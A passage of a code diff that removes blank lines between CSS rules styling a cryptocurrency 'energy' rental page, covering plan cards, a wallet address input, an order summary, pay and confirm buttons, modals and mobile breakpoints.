         }
-
         .planCard:hover {
           transform: translateY(-2px);
           border-color:
             rgba(103, 232, 249, 0.35);
         }
-
         .planCard.selected {
           border-color:
             rgba(103, 232, 249, 0.8);
@@ -1812,17 +1339,14 @@ const signedTransaction =
             inset 0 0 0 1px
             rgba(103, 232, 249, 0.1);
         }
-
         .planTop {
           min-height: 30px;
           display: flex;
           justify-content: space-between;
         }
-
         .energyIcon {
           font-size: 22px;
         }
-
         .selectedTag {
           padding: 5px 9px;
           border-radius: 999px;
@@ -1831,26 +1355,22 @@ const signedTransaction =
           font-size: 11px;
           font-weight: 800;
         }
-
         .energyAmount {
           margin-top: 16px;
           font-size: 32px;
           font-weight: 900;
         }
-
         .energyLabel {
           margin-top: 4px;
           color: #67e8f9;
           font-size: 13px;
         }
-
         .planDivider {
           height: 1px;
           margin: 20px 0;
           background:
             rgba(255, 255, 255, 0.08);
         }
-
         .priceRow,
         .summaryRow,
         .completedOrderRow {
@@ -1859,34 +1379,28 @@ const signedTransaction =
           justify-content: space-between;
           gap: 15px;
         }
-
         .priceRow {
           color: #8d98aa;
           font-size: 14px;
         }
-
         .priceRow strong {
           color: #ffffff;
           font-size: 20px;
         }
-
         .durationRow {
           margin-top: 12px;
           color: #7e899c;
           font-size: 13px;
         }
-
         .planDescription {
           margin: 10px 0 0;
           color: #657084;
           font-size: 12px;
           line-height: 1.6;
         }
-
         .addressHeading {
           margin-top: 36px;
         }
-
         .inputWrapper {
           display: flex;
           height: 62px;
@@ -1901,7 +1415,6 @@ const signedTransaction =
           background:
             rgba(3, 7, 18, 0.48);
         }
-
         .inputWrapper:focus-within {
           border-color:
             rgba(103, 232, 249, 0.65);
@@ -1909,7 +1422,6 @@ const signedTransaction =
             0 0 0 3px
             rgba(34, 211, 238, 0.08);
         }
-
         .inputIcon {
           display: grid;
           width: 32px;
@@ -1922,7 +1434,6 @@ const signedTransaction =
           font-size: 14px;
           font-weight: 900;
         }
-
         .addressInput {
           width: 100%;
           border: 0;
@@ -1931,17 +1442,14 @@ const signedTransaction =
           background: transparent;
           font-size: 15px;
         }
-
         .addressInput::placeholder {
           color: #4f596c;
         }
-
         .addressHint {
           margin-top: 10px;
           color: #fca5a5;
           font-size: 12px;
         }
-
         .orderSummary {
           margin-top: 22px;
           padding: 19px;
@@ -1952,24 +1460,20 @@ const signedTransaction =
           background:
             rgba(255, 255, 255, 0.025);
         }
-
         .summaryTitle {
           margin-bottom: 14px;
           color: #67e8f9;
           font-size: 13px;
           font-weight: 800;
         }
-
         .summaryRow {
           padding: 8px 0;
           color: #778297;
           font-size: 13px;
         }
-
         .summaryRow strong {
           color: #ffffff;
         }
-
         .connectedBox {
           margin-top: 22px;
           padding: 19px;
@@ -1980,26 +1484,22 @@ const signedTransaction =
           background:
             rgba(34, 211, 238, 0.07);
         }
-
         .connectedTop {
           display: flex;
           align-items: center;
           justify-content: space-between;
           gap: 15px;
         }
-
         .connectedLabel {
           color: #8190a4;
           font-size: 12px;
         }
-
         .connectedWallet {
           margin-top: 4px;
           color: #ffffff;
           font-size: 17px;
           font-weight: 800;
         }
-
         .connectedStatus {
           padding: 6px 10px;
           border-radius: 999px;
@@ -2008,7 +1508,6 @@ const signedTransaction =
             rgba(34, 197, 94, 0.1);
           font-size: 11px;
         }
-
         .connectedAddress {
           margin-top: 14px;
           overflow-wrap: anywhere;
@@ -2021,13 +1520,11 @@ const signedTransaction =
           font-size: 13px;
           line-height: 1.7;
         }
-
         .connectedNote {
           margin-top: 10px;
           color: #728095;
           font-size: 12px;
         }
-
         .changeWalletButton {
           margin-top: 15px;
           padding: 9px 13px;
@@ -2041,12 +1538,10 @@ const signedTransaction =
           cursor: pointer;
           font-size: 12px;
         }
-
         .changeWalletButton:disabled {
           opacity: 0.55;
           cursor: not-allowed;
         }
-
         .completedOrderBox {
           margin-top: 22px;
           padding: 19px;
@@ -2057,24 +1552,20 @@ const signedTransaction =
           background:
             rgba(34, 197, 94, 0.07);
         }
-
         .completedOrderTitle {
           margin-bottom: 11px;
           color: #86efac;
           font-size: 14px;
           font-weight: 800;
         }
-
         .completedOrderRow {
           padding: 6px 0;
           color: #8190a4;
           font-size: 12px;
         }
-
         .completedOrderRow strong {
           color: #ffffff;
         }
-
         .payButton {
           width: 100%;
           min-height: 59px;
@@ -2095,16 +1586,13 @@ const signedTransaction =
             0 14px 35px
             rgba(34, 211, 238, 0.17);
         }
-
         .payButton:hover:not(:disabled) {
           filter: brightness(1.06);
         }
-
         .payButton:disabled {
           opacity: 0.55;
           cursor: not-allowed;
         }
-
         .confirmButton {
           width: 100%;
           min-height: 59px;
@@ -2125,16 +1613,13 @@ const signedTransaction =
             0 14px 35px
             rgba(34, 211, 238, 0.17);
         }
-
         .confirmButton:hover:not(:disabled) {
           filter: brightness(1.06);
         }
-
         .confirmButton:disabled {
           opacity: 0.55;
           cursor: not-allowed;
         }
-
         .securityNotice {
           display: flex;
           margin-top: 19px;
@@ -2146,18 +1631,15 @@ const signedTransaction =
           line-height: 1.65;
           text-align: left;
         }
-
         .securityNotice p {
           margin: 0;
         }
-
         .telegramInfo {
           margin-top: 14px;
           color: #4f5c72;
           font-size: 11px;
           text-align: center;
         }
-
         .footer {
           width: min(900px, 100%);
           margin: 34px auto 0;
@@ -2166,11 +1648,9 @@ const signedTransaction =
           line-height: 1.7;
           text-align: center;
         }
-
         .footer p {
           margin: 6px 0 0;
         }
-
         .messageOverlay {
           position: fixed;
           z-index: 2000;
@@ -2182,7 +1662,6 @@ const signedTransaction =
             rgba(3, 6, 18, 0.78);
           backdrop-filter: blur(10px);
         }
-
         .messageModal {
           width: min(100%, 440px);
           max-height: calc(100vh - 40px);
@@ -2203,7 +1682,6 @@ const signedTransaction =
             rgba(0, 0, 0, 0.55);
           text-align: center;
         }
-
         .messageIcon {
           display: grid;
           width: 58px;
@@ -2215,7 +1693,6 @@ const signedTransaction =
           background: #67e8f9;
           font-weight: 900;
         }
-
         .messageText {
           margin-top: 21px;
           color: #dbeafe;
@@ -2224,7 +1701,6 @@ const signedTransaction =
           font-size: 15px;
           line-height: 1.75;
         }
-
         .messageButton {
           width: 100%;
           min-height: 49px;
@@ -2236,51 +1712,40 @@ const signedTransaction =
           cursor: pointer;
           font-weight: 900;
         }
-
         @media (max-width: 680px) {
           .page {
             padding: 0 14px 35px;
           }
-
           .header {
             min-height: 72px;
           }
-
           .brandSub {
             display: none;
           }
-
           .networkBadge {
             padding: 8px 10px;
             font-size: 10px;
           }
-
           .hero {
             margin: 48px auto 27px;
           }
-
           .heroTitle {
             font-size: 42px;
             letter-spacing: -1px;
           }
-
           .heroText {
             font-size: 14px;
           }
-
           .rentalCard {
             padding: 22px 17px;
             border-radius: 24px;
           }
-
           .planGrid {
             grid-template-columns: 1fr;
           }
-
           .sectionHeading h2 {
             font-size: 18px;
           }
-
           .addressInput {
             font-size: 13px;
           }
